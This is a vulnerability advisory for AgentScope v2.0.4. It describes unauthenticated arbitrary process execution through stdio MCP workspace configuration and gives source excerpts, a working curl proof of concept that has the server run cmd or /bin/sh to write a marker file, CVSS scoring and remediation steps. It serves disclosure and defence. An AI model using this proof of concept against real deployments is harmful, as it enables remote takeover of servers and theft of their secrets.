# AgentScope unauthenticated arbitrary process execution via MCP stdio workspace configuration (CWE-78, CVSS 9.8)

## Summary

An unauthenticated attacker who can reach the AgentScope API registers a stdio MCP workspace configuration whose `command` field names an arbitrary local executable, and the server spawns that process when the configuration is saved. `StdioMCPConfig.command` (src/agentscope/mcp/_config.py:14) is declared as `str` with no validators and no allowlist or trusted-directory restriction, and the value is passed through `_initialize_client()` (src/agentscope/mcp/_mcp_client.py:176-187) into `StdioServerParameters()`/`stdio_client()`, which spawns a local child process via `subprocess.Popen`. The `POST /workspace/mcp` endpoint that accepts the configuration (src/agentscope/app/_router/_workspace.py:113-130) enforces no server-side authentication or authorization: the caller-supplied `X-User-ID` header (src/agentscope/app/deps.py:20-42, a self-described "Temporary header-based identity") is accepted as identity context and can be trivially spoofed. For stateful MCPs — stdio is always stateful — `add_mcp()` calls `mcp_client.connect()` immediately on save (src/agentscope/workspace/_local_workspace.py:691-702), so the configured process starts before MCP protocol negotiation completes. An attacker who can reach the AgentScope API (default `0.0.0.0:8000`, LocalWorkspace mode) obtains remote code execution as the OS user running the AgentScope server.

## Details

AgentScope's MCP system supports stdio transports, in which the server starts a local program and communicates over its standard input and output. In v2.0.4 (commit `ded7ccd`), every link on that path takes caller-controlled data without validation:

1. **The configuration model accepts any executable path.** `StdioMCPConfig.command` at `src/agentscope/mcp/_config.py:14` is declared as `str` with no validators and is not constrained to an allowlist, a trusted directory, a package-managed MCP server registry, or server-side administrator-defined entries. Any string value is accepted, together with caller-controlled `args` and `env`:

```python
# src/agentscope/mcp/_config.py:12-17
type: Literal["stdio_mcp"] = "stdio_mcp"

command: str = Field(
    title="Command",
    description="The command to start the MCP server.",
)
```

2. **The value is handed straight to process creation.** `_initialize_client()` at `src/agentscope/mcp/_mcp_client.py:176-187` passes the caller-controlled `command` and `args` into `StdioServerParameters()` and then to `stdio_client()`, the MCP SDK transport that spawns a child process via `subprocess.Popen`:

```python
# src/agentscope/mcp/_mcp_client.py:176-187
if self.mcp_config.type == "stdio_mcp":
    config = self.mcp_config
    self._client = stdio_client(
        StdioServerParameters(
            command=config.command,
            args=config.args or [],
            env=config.env,
            cwd=str(config.cwd) if config.cwd else None,
            encoding="utf-8",
            encoding_error_handler=config.encoding_error_handler,
        ),
    )
```

3. **The endpoint that accepts the configuration enforces no server-side authentication or authorization.** `POST /workspace/mcp` (src/agentscope/app/_router/_workspace.py:113-130) resolves the workspace from the caller-supplied `X-User-ID` header. `get_current_user_id()` (src/agentscope/app/deps.py:20-42) performs only one check — that the header is non-empty — and returns its value as the identity context; the header's own description reads "Temporary header-based identity; will be replaced by JWT auth." (deps.py:22-23):

```python
# src/agentscope/app/_router/_workspace.py:113-121
@workspace_router.post("/mcp", status_code=status.HTTP_201_CREATED)
async def add_mcp(
    mcp: MCPClient,
    agent_id: str = Query(...),
    session_id: str = Query(...),
    user_id: str = Depends(get_current_user_id),
    storage: StorageBase = Depends(get_storage),
    workspace_manager: WorkspaceManagerBase = Depends(get_workspace_manager),
) -> None:
    """Add an MCP client to the session's workspace."""

# src/agentscope/app/deps.py:20-25, 37-42 -- the only check is non-emptiness
async def get_current_user_id(
    x_user_id: str = Header(
        description="Caller's user ID. "
        "Temporary header-based identity; will be replaced by JWT auth.",
    ),
) -> str:
    ...
    if not x_user_id:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="X-User-ID header is required.",
        )
    return x_user_id
```

4. **The process starts immediately on save.** For stateful MCP clients — and stdio clients are always stateful — `add_mcp()` connects the client before the request returns (src/agentscope/workspace/_local_workspace.py:691-702), so the configured process is spawned as soon as the configuration is stored, before MCP protocol negotiation completes:

```python
# src/agentscope/workspace/_local_workspace.py:691-702
async def add_mcp(self, mcp_client: MCPClient) -> None:
    """Add an MCP client, connect it if stateful, and persist.

    Args:
        mcp_client (`MCPClient`):
            The MCP client to add.
    """
    async with self._mcp_lock:
        if mcp_client.is_stateful and not mcp_client.is_connected:
            await mcp_client.connect()
        self._mcps.append(mcp_client)
        await self._save_mcp_file()
```

**Why this is a vulnerability, not "intended MCP functionality":**

- The dangerous capability — arbitrary process execution — is exposed through a network API without an enforced trust boundary. The security issue is not the existence of the `command` field for legitimate MCP server configuration; it is the combination of (a) remote API exposure, (b) caller-controlled identity, (c) free-form stdio MCP command configuration, and (d) immediate process spawn on configuration save.
- The `command` field should be restricted to a server-side registry of pre-approved MCP servers. Accepting arbitrary executable paths from unauthenticated API callers converts a configuration convenience into a process-execution primitive.
- Even in authenticated deployments, the `/workspace/mcp` endpoint should be restricted to trusted administrative users, because configuring stdio MCP servers grants local process-execution capability.

## Proof of Concept

Dynamically verified against v2.0.4 on 2026-07-08, on a Windows 11 host running the default LocalWorkspace deployment (`pip install -e ".[service,storage]"`, Redis 7, the example agent service `examples/agent_service/main.py` bound to `0.0.0.0:8000`). All three recorded success criteria passed: the HTTP response was the expected 500/timeout, the marker file was created on the AgentScope host, and its content was the expected marker string. The marker file name and marker string in this write-up are neutralized (`poc_marker.txt` / `POC_EXECUTED`); the command structure is unchanged. The Windows payload below is the one that was dynamically tested; the Linux/macOS variant exercises the same code path.

**Step 1 — Setup.** Create an agent and a session. All requests use the unauthenticated API: the `X-User-ID` header value is not verified.

```bash
# Create agent
curl -s -X POST http://localhost:8000/agent/ \
  -H "X-User-ID: admin" -H "Content-Type: application/json" \
  -d '{"name":"PoC","system_prompt":"test"}'
# Expected: HTTP 201, {"agent_id":"<AGENT_ID>"}

# Create session (requires a pre-existing credential; any LLM provider works)
curl -s -X POST http://localhost:8000/sessions/ \
  -H "X-User-ID: admin" -H "Content-Type: application/json" \
  -d '{"agent_id":"<AGENT_ID>","chat_model_config":{"type":"deepseek_credential","credential_id":"<CRED_ID>","model":"deepseek-v4-flash","parameters":{}}}'
# Expected: HTTP 201, {"session_id":"<SESSION_ID>"}
```

**Step 2 — Exploit.** Register a stdio MCP configuration whose `command` is a system executable that writes a marker file:

```bash
# Windows payload (tested):
curl -s -X POST "http://localhost:8000/workspace/mcp?agent_id=<AGENT_ID>&session_id=<SESSION_ID>" \
  -H "X-User-ID: admin" -H "Content-Type: application/json" \
  -d '{"name":"poc","is_stateful":true,"connection_scope":"isolated","mcp_config":{"type":"stdio_mcp","command":"cmd","args":["/c","echo POC_EXECUTED > C:\\Users\\Public\\poc_marker.txt"]}}'

# Linux/macOS payload (same code path, /bin/sh must be available):
# {"type":"stdio_mcp","command":"/bin/sh","args":["-c","id > /tmp/poc_marker.txt"]}
```

(On Windows, backslashes in JSON strings must be escaped as above or replaced with forward slashes; an unescaped `\` is an illegal JSON escape.)

**Step 3 — Verify.** The HTTP response may be 500 or a timeout. This is expected, not a failed PoC: the injected command does not implement the MCP JSON-RPC protocol, so the MCP handshake attempt fails — but `subprocess.Popen` has already spawned the attacker's process before the handshake error is raised. Check the marker file on the AgentScope host:

```bash
# Windows:
dir C:\Users\Public\poc_marker.txt
type C:\Users\Public\poc_marker.txt
# -> POC_EXECUTED

# Linux/macOS:
ls -la /tmp/poc_marker.txt
```

The file is created with the privileges of the AgentScope server process user. The HTTP protocol-layer error is independent of — and does not prevent — the code execution that has already occurred.

## Impact

- **Type:** Improper Neutralization of Special Elements used in an OS Command (CWE-78) — the `command` field accepts arbitrary executable paths, enabling attacker-controlled process execution.
- **Who is impacted:** AgentScope v2.0.4 deployments where the workspace MCP API is reachable by untrusted clients and stdio MCP configuration is enabled. The default LocalWorkspace configuration is affected. Docker/E2B workspace backends contain the spawned process within the sandbox, but the command still executes within it.
- **Attacker capabilities** (verified dynamically): execute arbitrary commands as the operating-system user running the AgentScope server process; disclose local files and environment variables (including LLM API keys); modify or delete application data; install or execute additional payloads; and cause denial of service. The attack requires no prior credentials, no user interaction, and no special preconditions beyond network reachability to the AgentScope API.
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical).
  - AV:N — exploitable over the network via a single HTTP POST request.
  - AC:L — constructing the JSON body requires no special conditions.
  - PR:N — the endpoint is reachable without a real credential; the `X-User-ID` header is attacker-chosen and does not constitute a privilege.
  - UI:N — no user interaction beyond sending the HTTP request.
  - S:U — execution occurs within the AgentScope process's OS user context.
  - C:H / I:H / A:H — full read, write, and delete within that user's OS permissions.

**Scope note (alternate scoring).** If maintainers determine that affected deployments require prior authenticated administrative access to configure workspace MCPs, the `PR:N` metric should be reassessed to `PR:L`, and the same vector scores **8.8** (High) instead of 9.8.

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Package name** | `agentscope` |
| **Affected versions** | `<= 2.0.4` |
| **Patched versions** | `None` |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

## Remediation

1. Restrict `StdioMCPConfig.command` to an allowlist of pre-registered, server-side approved MCP server executables; do not accept arbitrary process definitions from API clients.
2. Require server-side authentication and authorization before allowing MCP workspace configuration changes; restrict `POST /workspace/mcp` to authenticated administrative users. (The missing authentication on the `X-User-ID` identity header is tracked in a separate report.)
3. Execute all MCP stdio processes inside an OS-level sandbox with minimal filesystem, network, and environment access.
4. Disable stdio MCP configuration in remotely exposed deployments by default.
5. Operator workaround: bind the service to `127.0.0.1` instead of `0.0.0.0`.
6. Operator workaround: block `POST /workspace/mcp` at the network or reverse-proxy layer.

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-78 | Improper Neutralization of Special Elements used in an OS Command | The caller-controlled `command` value is accepted without any validation and handed to process creation via `StdioServerParameters()`/`stdio_client()`, which spawns it through `subprocess.Popen` (_mcp_client.py:176-187) |
